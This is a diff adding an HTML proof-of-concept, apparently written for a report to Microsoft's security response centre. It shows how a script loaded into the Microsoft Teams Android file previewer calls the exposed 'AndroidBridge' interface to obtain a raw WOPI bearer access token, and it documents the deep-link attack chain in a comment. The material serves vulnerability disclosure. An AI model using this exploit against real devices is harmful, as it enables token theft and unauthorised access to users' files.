@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<!-- MSRC PoC 3 — Zero-origin AndroidBridge WOPI token extraction
+     Target: com.microsoft.teams JsApiWebViewManager (file previewer)
+     Flow: msteams://teams.microsoft.com/l/file/{id}?fileType=docx&objectUrl=<URL-encoded origin>
+           -> createFileInfoFromDeeplink() -> openFilePreview() -> OwlFilePreviewFragment
+           -> JsApiWebViewManager.loadDataWithBaseURL(scheme://host-of-objectUrl, html)
+           -> addJavascriptInterface(JsApiPreviewerInterface, "AndroidBridge")
+     Missing rung: requires script execution under the objectUrl origin (tenant XSS,
+     or an objectUrl pointing at attacker-influenced origin accepted by isSameOrigin). -->
+<html>
+<head><meta charset="utf-8"><title>bridge probe</title></head>
+<body>
+<pre id="log">probing...</pre>
+<script>
+function send(method) {
+  // JsApiPreviewerInterface.postMessage(String) — the only bridge entry
+  window.AndroidBridge.postMessage(JSON.stringify({ method: method, correlationId: "poc" }));
+}
+// handleFileToLoad responds with TeamsFileInfo containing accessToken
+// (raw WOPI Bearer token) delivered to window.jsApiNativeBridge.onResponse
+window.jsApiNativeBridge = {
+  onResponse: function (payload) {
+    document.getElementById("log").textContent =
+      "CAPTURED: " + payload; // accessToken visible here in page JS
+  }
+};
+send("fileToLoad");
+</script>
+</body>
+</html>
